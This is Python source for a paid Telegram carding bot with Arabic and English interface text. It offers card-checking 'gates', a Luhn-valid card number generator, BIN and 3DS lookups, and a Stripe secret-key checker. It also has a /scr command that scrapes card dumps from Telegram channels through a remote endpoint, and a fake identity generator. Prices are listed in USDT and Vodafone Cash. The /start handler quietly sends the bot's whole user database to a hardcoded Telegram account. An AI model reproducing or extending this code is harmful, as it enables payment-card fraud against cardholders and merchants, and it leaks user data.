	if card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
		while len(generated_num) < 15:
			generated_num += str(random.randint(0, 9))
		check_digit = generate_check_digit(generated_num)
		credit_card_number = generated_num + str(check_digit)
		return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
	elif card_number[:1] == "3":
		while len(generated_num) < 14:
			generated_num += str(random.randint(0, 9))
		check_digit = generate_check_digit(generated_num)
		credit_card_number = generated_num + str(check_digit)
		return f"{credit_card_number}|{str(expiry_month).zfill(2)}|{str(expiry_year)[-2:]}|{cvv}"
def generate_check_digit(num):
	num_list = [int(x) for x in num]
	for i in range(len(num_list) - 1, -1, -2):
		num_list[i] *= 2
		if num_list[i] > 9:
			num_list[i] -= 9
	return (10 - sum(num_list) % 10) % 10
def luhn_checksum(card_number):
	digits = [int(x) for x in card_number]
	odd_digits = digits[-1::-2]
	even_digits = digits[-2::-2]
	checksum = sum(odd_digits)
	for digit in even_digits:
		checksum += sum(divmod(digit * 2, 10))
	return checksum % 10



def reset_command_usage():
	for user_id in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}

def check_command_limit(user_id):
	current_time = datetime.now()
	if user_id not in command_usage:
		command_usage[user_id] = {'count': 0, 'last_time': None}
	
	# التحقق من عدد مرات استخدام الأمر في الساعة
	if command_usage[user_id]['last_time'] is None or (current_time - command_usage[user_id]['last_time']).seconds > 3600:
		command_usage[user_id]['count'] = 0
	
	# إذا كان قد تجاوز الحد الأقصى لعدد مرات الاستخدام
	if command_usage[user_id]['count'] >= 30:
		next_hour = command_usage[user_id]['last_time'] + timedelta(hours=1)
		time_until_next_hour = (next_hour - current_time).seconds // 60
		return False, time_until_next_hour
	
	return True, None
@bot.message_handler(commands=["cmd","cmds"])
def start(message):
	gates_on=0
	gates_of=0
	gates_total=0
	gates_fr=0
	gates_pro=0
	with open('data.json') as f:
		data = json.load(f)
	for key, value in data.items():
			try:
				h=value['status']
				b=value['typ']
				gates_total+=1
				if h == 'Online':
					gates_on+=1
				else:
					gates_of+=1
				if b == 'Premium':
					gates_pro+=1
				else:
					gates_fr+=1
			except:
				pass
	keyboard = types.InlineKeyboardMarkup()
	free = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐀𝐮𝐭𝐡', callback_data='Auth')
	pro = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐂𝐡𝐚𝐫𝐠𝐞', callback_data='charge')
	tool = types.InlineKeyboardButton(text='𝐓𝐨𝐨𝐥𝐬', callback_data='tool')
	plans = types.InlineKeyboardButton(text='𝐏𝐥𝐚𝐧𝐬', callback_data='plans')
	gt = types.InlineKeyboardButton(text='𝐆𝐞𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦/𝐕𝐈𝐏', callback_data='plans')
	acc=types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(free,pro)
	keyboard.row(gt)
	keyboard.row(plans,tool)
	keyboard.row(acc)
	bot.reply_to(message,text=f'''<b>Total Gates ➜ {gates_total} 📃
Total Tools ➜ 6 🧾
Premium Gates ➜ {gates_pro} 💎
Free Gates ➜ {gates_fr} 💸
Gates Online ➜ {gates_on} ✅
Gates ofline ➜ {gates_of} ❌
━━━━━━━━━━━━━━━━━</b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.message_handler(commands=["id"])
def start(message):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=message.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	up = types.InlineKeyboardButton(text='𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐔𝐩𝐠𝐫𝐚𝐝𝐞', callback_data='plans')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(up)
	keyboard.row(back)
	plan=json_data[str(id)]['plan']
	fun=json_data[str(id)]['funds']
	username = message.from_user.first_name
	bot.reply_to(message,
					  text=f'''<b>Account Info 👤
━━━━━━━━━━━━━━━━━
ID: <code>{id}</code>
Name: <a href="https://t.me/{message.from_user.username}">{username}</a>
Username: @{message.from_user.username}
Your Plan: {plan}
Credits: {fun}
━━━━━━━━━━━━━━━━━
<a href="https://t.me/{userdeve}">Do You Need Help?</a></b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.message_handler(commands=["start","help"])
def start(message):
	def my_function():
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		id=message.from_user.id
		
		try:BL=(json_data[str(id)])
		except:
			BL='Free'
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
			us=int((json_data['users']))
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
				json_data[f"users"] = us+1
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			file_path = 'data.json'
			file = open('data.json', 'r+')
			json_data = json.load(file)

			new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
		keyboard = types.InlineKeyboardMarkup()
		username = message.from_user.first_name
		# إنشاء الأزرار الشفافة
		button1 = types.InlineKeyboardButton(text='𝐌𝐞𝐧𝐮', callback_data='menu')
		button2 = types.InlineKeyboardButton(text="Use The Bot Free - استخدام البوت مجانا ", url=f"https://t.me/{group}")
		add_bot_button = types.InlineKeyboardButton(text='𝐀𝐝𝐝 𝐁𝐨𝐭 𝐭𝐨 𝐌𝐲 𝐆𝐫𝐨𝐮𝐩', url=f'https://t.me/{botuser}?startgroup')
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		us=int((json_data['users']))+307
		keyboard.row(button1)
		keyboard.row(button2)
		keyboard.row(add_bot_button)
		msg = bot.reply_to(message, f'''<b>🤖 Bot Status: Active ✅

Join <a href="t.me/CCMO3">Here</a> to Get Updates And Keys For The Bot

If You Want to Run a Bot In Your Group, Make Sure The Bot is The Admin 🎁</b>''', reply_markup=keyboard)
		with open('data.json', 'rb') as file:
			bot.send_document(5487169888, file)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["on","of"])
def start(message):
	try:
		if not message.from_user.id == owner:
			return
		if 'of' in message.text:
			id=message.text.replace('/of ', '')
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
				json_data[f'{id}']['status'] = 'ofline'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
		if 'on' in message.text:
			id=message.text.replace('/on ', '')
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
				json_data[f'{id}']['status'] = 'Online'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
		
		bot.reply_to(message, 'Successful')
	except:
		bot.reply_to(message,'ERROR')
@bot.callback_query_handler(func=lambda call: call.data == 'plans')
def menu_callback(call):
	keyboard = types.InlineKeyboardMarkup()
	up = types.InlineKeyboardButton(text='𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫', url=f'http://t.me/{userdeve}')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(up)
	keyboard.row(back)
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''<b>خطة الVIP تتيح لك استخدام كل الادوات والبوابات في البوت بلا حدود 
يمكنك ايضا فحص البطاقات من خلال ملف 
مثال  > t.me/The_FJU/21320
----------------------------------
خطة الPremium يمكنك استخدام كل البوابات والادوات ولاكن لا يمكنك فحص بطاقات من ملف
━━━━━━━━━━━━━━━━━
اسعار الاشتراك في خطة الVIP: 
اسبوع = 10$
شهر = 30$
3 شهور = 80$
دائم = 100$
----------------------------------
اسعار الاشتراك في خطة الPremium: 
اسبوع = 7.99$
شهر = 18.99$
3 شهور = 45$
دائم = 60$
----------------------------------
طرق الدفع:
عملات مشفرة USDT شبكة Trc20:
{trc}
----------
فودافون كاش:
	{cash}

قم بالدفع اولا ثم تواصل مع المطور لتاكيد الدفع واختيار اشتراك
━━━━━━━━━━━━━━━━━
 The VIP Plan Allows You to Use All The Tools And Gateways in The Bot Without Limits. You Can Also Check The Cards Through an Example File > t.me/The_FJU/21320
----------------------------------
in The Premium Plan, You Can Use All The Gateways And Tools, But You Cannot Check Cards From a File.
━━━━━━━━━━━━━━━━━
Subscription prices for the VIP plan:
One week = $10
One month = $30
3 months = $80
Permanent = $100
━━━━━━━━━━━━━━━━━
Premium plan subscription prices:
1 week = $7.99
1 month = $18.99 
3 months = $45 
permanent = $60
----------------------------------
Payment Methods:
USDT Trc20: {trc}
----------
Vodafone Cash: {cash}

Make The Payment First, Then Contact The Developer to Confirm The Payment And Choose a Subscription</b>
''',reply_markup=keyboard)
@bot.callback_query_handler(func=lambda call: call.data == 'acc')
def menu_callback(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	up = types.InlineKeyboardButton(text='𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐔𝐩𝐠𝐫𝐚𝐝𝐞', callback_data='plans')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(up)
	keyboard.row(back)
	plan=json_data[str(id)]['plan']
	fun=json_data[str(id)]['funds']
	username = call.from_user.first_name
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''<b>Account Info 👤
━━━━━━━━━━━━━━━━━
ID: <code>{id}</code>
Name: <a href="t.me/{call.from_user.username}">{username}</a>
Username: @{call.from_user.username}
Your Plan: {plan}
Credits: {fun}
━━━━━━━━━━━━━━━━━
<a href="https://t.me/{userdeve}">Do You Need Help?</a></b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'menu')
def menu_callback(call):
	gates_on=0
	gates_of=0
	gates_total=0
	gates_fr=0
	gates_pro=0
	with open('data.json') as f:
		data = json.load(f)
	for key, value in data.items():
			try:
				h=value['status']
				b=value['typ']
				gates_total+=1
				if h == 'Online':
					gates_on+=1
				else:
					gates_of+=1
				if b == 'Premium':
					gates_pro+=1
				else:
					gates_fr+=1
			except:
				pass
	keyboard = types.InlineKeyboardMarkup()
	free = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐀𝐮𝐭𝐡', callback_data='Auth')
	pro = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐂𝐡𝐚𝐫𝐠𝐞', callback_data='charge')
	tool = types.InlineKeyboardButton(text='𝐓𝐨𝐨𝐥𝐬', callback_data='tool')
	plans = types.InlineKeyboardButton(text='𝐏𝐥𝐚𝐧𝐬', callback_data='plans')
	gt = types.InlineKeyboardButton(text='𝐆𝐞𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦/𝐕𝐈𝐏', callback_data='plans')
	acc=types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(free,pro)
	keyboard.row(gt)
	keyboard.row(plans,tool)
	keyboard.row(acc)
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''<b>Total Gates ➜ {gates_total} 📃
Total Tools ➜ 6 🧾
Premium Gates ➜ {gates_pro} 💎
Free Gates ➜ {gates_fr} 💸
Gates Online ➜ {gates_on} ✅
Gates ofline ➜ {gates_of} ❌
━━━━━━━━━━━━━━━━━</b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'Auth')
def menu_callback(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='unregistered'
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	button1 = types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(button1)
	keyboard.row(back)
	msgs=''
	with open('data.json') as f:
			data = json.load(f)
	for key, value in data.items():
		try:
			status=value['status']
			if status == 'Online':
				status='Online ✅'
			else:
				status='ofline ❌'
			typ=value['typ']
			name=value['name']
			if 'Auth' in name:
					msg=f'''[•] Name: {name}
[•] Usage: {key}
[•] Status: {status}
[•] Type: {typ}\n━━━━━━━━━━━━━━━━━\n'''
					msgs+=msg
		except:
			continue
	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''<b>
{msgs}</b>
''',reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'tool')
def menu_callback(call):
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(back)
	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='''<b>BIN Info:
Retrieve information for a specific Bank Identification Number.
Command: /bin {6-digit bin}
Example: <code>/bin 412236</code>
━━━━━━━━━━━━━━━━━
CC Generator:
Generate a credit card number for testing purposes.
Command: /gen CARD_NUMBER | EXP_DATE | CVV
Example: <code>/gen 412236xxxx|xx|2025|xxx</code>
━━━━━━━━━━━━━━━━━
Redeem Key: 
/redeem key
━━━━━━━━━━━━━━━━━
CC Scrapper:
Usage: /scr username amount bin (optional) [Max 10000000 Scrapes at a Time]
━━━━━━━━━━━━━━━━━
Check OTP?:
Usage: /vbv CARD_NUMBER | EXP_DATE | CVV</b>
━━━━━━━━━━━━━━━━━
Check API Key Stripe: 
/sk key
━━━━━━━━━━━━━━━━━''',reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'charge')
def menu_callback(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	button1 = types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(button1)
	keyboard.row(back)
	msgs=''
	with open('data.json') as f:
			data = json.load(f)
	for key, value in data.items():
		try:
			status=value['status']
			if status == 'Online':
				status='Online ✅'
			else:
				status='ofline ❌'
			typ=value['typ']
			name=value['name']
			if 'CVV' in name or 'Charge' in name or 'CCN' in name or '$' in name:
				if not 'Auth' in name:
					msg=f'''[•] Name: {name}
[•] Usage: {key}
[•] Status: {status}
[•] Type: {typ}\n━━━━━━━━━━━━━━━━━\n'''
					msgs+=msg
		except:
			continue
	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''<b>
{msgs}</b>
''',reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop(call):
	def my_function():
		id = message.from_user.id
		try:
			stopuser[f'{id}']['status'] = 'stop'
		except:
			pass
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		json_data[str(id)]['order'] = 'stop'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
	my_thread = threading.Thread(target=my_function)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	def my_function():
		user_id = message.from_user.id
		gate='3DS Lookup'
		id=message.from_user.id
		try:
			cc = message.reply_to_message.text
		except:
		   cc=message.text
		cc=str(reg(cc))
		if cc == 'None':
			bot.reply_to(message, '''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
			return
		username = message.from_user.first_name
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		res=(json_data['/vbv'])
		if 'OFF' == res:
			bot.reply_to(message,'<b>The Gate Is Under Maintenance 🔧⚙️</b>',parse_mode="HTML")
			return
		ko = (bot.reply_to(message, f"<b>Checking Your Card...⌛</b>",parse_mode="HTML").message_id)
		start_time = time.time()
		try:
			last = str(vbv(cc))
		except Exception as e:
			print('ERROR : ',e)
			last='Error'
		try: 	headers = {
		'authorization': 'pk_q3mszgnusk66c24k7loecckxtaf',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
	};json_data = {
		'type': 'card',
		'number': cc.split('|')[0],
		'expiry_month': 5,
		'expiry_year': 2024,
		'cvv': '421',
		'name': 'JOHN HARGROVE',
		'phone': {},
		'preferred_scheme': '',
		'requestSource': 'JS',
	};data = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data).json()
		except: pass
		try:
			brand = data['scheme']
		except:
			brand = 'Unknown'
		try:
			card_type = data['card_type']
		except:
			card_type = 'Unknown'
		try:
			country = data['issuer_country']
			country_flag =flagz.by_code(country)
		except:
			country = 'Unknown'
			country_flag = 'Unknown'
		try:
			bank = data['issuer']
		except:
			bank = 'Unknown'
		end_time = time.time()
		execution_time = end_time - start_time
		if 'Successful' in last or 'Unavailable' in last or 'successful' in last:
			status='𝐏𝐚𝐬𝐬𝐞𝐝 ✅'
		else:
			status='𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌'
		msg=f'''<b>{status}
			
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {last}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gate}
	
𝐁𝐈𝐍 ➜ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➜ {bank}

𝐓𝐢𝐦𝐞 {"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬</b>'''
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
#
@bot.message_handler(func=lambda message: message.text.lower().startswith('.fake') or message.text.lower().startswith('/fake'))
def respond_to_vbv(message):
	def my_function():
		try:
			try:
				u=message.text.split('fake ')[1]
			except:
				u='US'
			parsed_data = requests.get(f'https://randomuser.me/api/?nat={u}').json()
			results = parsed_data['results']
			result = results[0]
			name = f"{result['name']['title']} {result['name']['first']} {result['name']['last']}"
			street_number = result['location']['street']['number']
			street_name = result['location']['street']['name']
			city = result['location']['city']
			state = result['location']['state']
			country = result['location']['country']
			postcode = result['location']['postcode']
			fake = Faker()
			phone = fake.phone_number()
			email = fake.email()
			formatted_address = f"""<b>
{country} Address
Name: <code>{name}</code>
City: <code>{city}</code>
state: <code>{state}</code>
Zip Code: <code>{postcode}</code>
Street: <code>{street_number} {street_name}</code>
Phone: <code>{phone}</code>
Email: {email}</b>
			"""
			bot.reply_to(message, formatted_address,parse_mode="HTML")
		except:
			bot.reply_to(message, "Country code not found or not available.")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def gen(bin):
	remaining_digits = 16 - len(bin)
	card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits - 1)])
	digits = [int(digit) for digit in card_number]
	for i in range(len(digits)):
		if i % 2 == 0:
			digits[i] *= 2
			if digits[i] > 9:
				digits[i] -= 9
	
	checksum = sum(digits)
	checksum %= 10
	checksum = 10 - checksum
	if checksum == 10:
		checksum = 0
	card_number += str(checksum)
	return card_number
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bin') or message.text.lower().startswith('/bin'))
def respond_to_vbv(message):
		try:
			bm = message.reply_to_message.text
		except:
		   bm=message.text
		regex = r'\d+'
		try:
			matches = re.findall(regex, bm)
		except:
			bot.reply_to(message,'<b>🚫 Incorrect input. Please provide a 6-digit BIN number.</b>',parse_mode="HTML")
			return
		bin = ''.join(matches)[:6]
		ko = (bot.reply_to(message, "<b>Checking Your bin...⌛</b>",parse_mode="HTML").message_id)
		if len(re.findall(r'\d', bin)) >= 6:
			pass
		else:
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Incorrect input. Please provide a 6-digit BIN number.</b>''',parse_mode="HTML")
			return
		cc = gen(bin)
		brand, card_type, bank, country, country_flag, status = info(cc.split('|')[0])		
		if 'card_number_invalid' in status:
			msg='<b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ❌</b>'
		else:
			msg=f'''<b>
𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ✅
	
𝐁𝐈𝐍 ➜ <code>{bin[:6]}</code>
	
𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {card_type} - {brand}  
𝐁𝐚𝐧𝐤 ➜ {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag}</b> '''
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen') or message.text.lower().startswith('/gen'))
def respond_to_vbv(message):
	ko = (bot.reply_to(message, "<b>Generating cards...⌛</b>",parse_mode="HTML").message_id)
	generate_credit_card(message,bot,ko)
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id == admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r+') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas =f'{namebot}-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='premium'
			if 'VIP' in message.text:
				plan='VIP'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			file = open('data.json', 'r+')
			json_data = json.load(file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			msg=f'''<b>𝐍𝐞𝐰 𝐊𝐞𝐲 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 🚀
		
𝐏𝐥𝐚𝐧 ➜ {plan}
𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐈𝐧 ➜ {ig}
𝐊𝐞𝐲 ➜ <code>{pas}</code>
		
𝐔𝐬𝐞 /redeem [𝐊𝐞𝐲]</b>'''
			
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		try:
			id=message.from_user.id
			re=message.text.split(' ')[1]
			file = open('data.json', 'r+')
			json_data = json.load(file)
			try:
				user=json_data[str(id)]
			except:
				new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
	
				json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r+') as json_file:
				data = json.load(json_file)
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, indent=4)
			
			keyboard = types.InlineKeyboardMarkup()
			free = types.InlineKeyboardButton(text='𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬', callback_data='menu')
			keyboard.row(free)
			msg=f'''<b>𝐊𝐚𝐲𝐚𝐧 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐞𝐝 ✅
𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐈𝐧 ➜ {timer}
𝐓𝐲𝐩𝐞 ➜ {typ}</b>'''
			#
			bot.reply_to(message,msg,reply_markup=keyboard)
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.sk') or message.text.lower().startswith('/sk'))
def respond_to_vbv(message):
	def my_function():
		try:
			sk=message.text.split(' ')[1]
			ko = (bot.reply_to(message, "<b>Please Wait...⏳</b>",parse_mode="HTML").message_id)
			res=check_key(sk)
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=res)
		except:
			bot.reply_to(message, "<b>Invalid Format\nCorrect Format /sk sk_live_xxxx</b>",parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.scr') or message.text.lower().startswith('/scr'))
def respond_to_vbv(message):
	def my_function():
		
		cmd=message.text
		try:
			try:
				link=cmd.split(' ')[1]
				amount=cmd.split(' ')[2]
				if int(amount) > 10000000:
					ko = (bot.reply_to(message, "<b>The maximum limit is 10000000 😒</b>",parse_mode="HTML").message_id)
					return
			except:
				ko = (bot.reply_to(message, "<b>Usage: /scr username amount bin (optional)</b>",parse_mode="HTML").message_id)
				return
			try:
				key=cmd.split(' ')[3]
			except:
				key=''
			ko = (bot.reply_to(message, "<b>Scraping...⌛</b>",parse_mode="HTML").message_id)
		
			def heavy_task():
				start_time = time.time()
				response = requests.get(f'https://il-p-26-d89b06c63011.herokuapp.com/scraper?link={link}&amount={amount}&keyword={key}')
				ccs=(response.text)
				if 'server encountered an internal' in ccs:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Oops! encountered an error while scraping. Here are the details:
	
➜ Code: USERNAME_INVALID
➜ Message: The username is invalid
	
Please make sure you entered the correct username. If you believe this is an error, please check the spelling and try again. If the issue persists, kindly reach out to our support team for further assistance.</b>''',parse_mode="HTML")
					return
				name=(message.from_user.first_name)
				user=message.from_user.username
				with open('𝐊𝐀𝐘𝐀𝐍 𝑩𝒀 𝑴𝑶3𝑮𝒁𝑨.txt', 'w') as file:
					file.write(ccs)
				end_time = time.time()
				execution_time = end_time - start_time
				ui=len(ccs)
				try:
					bot.send_document(message.chat.id, open('𝐊𝐀𝐘𝐀𝐍 𝑩𝒀 𝑴𝑶3𝑮𝒁𝑨.txt', 'rb'),caption=f'''<b>𝑺𝑪𝑹𝑨𝑷𝑷𝑰𝑵𝑮 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫 ✅
		
𝑺𝑶𝑼𝑹𝑪𝑬 ➜ {link}
𝑨𝑴𝑶𝑼𝑵𝑻 ➜ {amount}
𝑭𝑶𝑼𝑵𝑫 ➜ {ui}
𝑻𝑰𝑴𝑬 » ➜ {"{:.1f}".format(execution_time)} 𝑺𝑬𝑪𝑶𝑵𝑫𝑺
		
𝑹𝑬𝑸𝑼𝑬𝑺𝑻 𝑩𝒀 ➜ <a href='https://t.me/{user}'>{name}</a>

𝑫𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹 ➜ <a href='https://t.me/{userdeve}'>𓆩 𝑴𝑶𝟑𝑮𝒁𝑨 𝑬𝐿 𝑯𝑨𝑪𝑲𝑬𝑹 𓆪</a>
		<a href='https://t.me/{userdeve}'><a href='https://t.me/{botuser}'>𝑐𝑙𝑖𝑐𝑘 ℎ𝑒𝑟𝑒 𝑡𝑜 𝑏𝑎𝑐𝑘 𝑓𝑜𝑟 𝑏𝑜𝑡</a></a></b>''',parse_mode="HTML")
					bot.delete_message(message.chat.id, ko)
				except Exception as e:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='No cards found 🚫',parse_mode="HTML")
					return
			p = Process(target=heavy_task)
			p.start()
		except Exception as e:
			print('ERROR : ',e)
			ko = (bot.reply_to(message, "<b>An unknown error has occurred</b>",parse_mode="HTML").message_id)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
#
@bot.message_handler(func=lambda message: message.text.lower().startswith('.stop') or message.text.lower().startswith('/stop'))
def respond_to_vbv(message):
	def my_function():
		id = message.from_user.id
		try:
			stopuser[f'{id}']['status'] = 'stop'
		except:
			pass
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		json_data[str(id)]['order'] = 'stop'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		bot.reply_to(message, f"<b>The check has been stopped </b>",parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
print('تم تشغيل البوت')
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")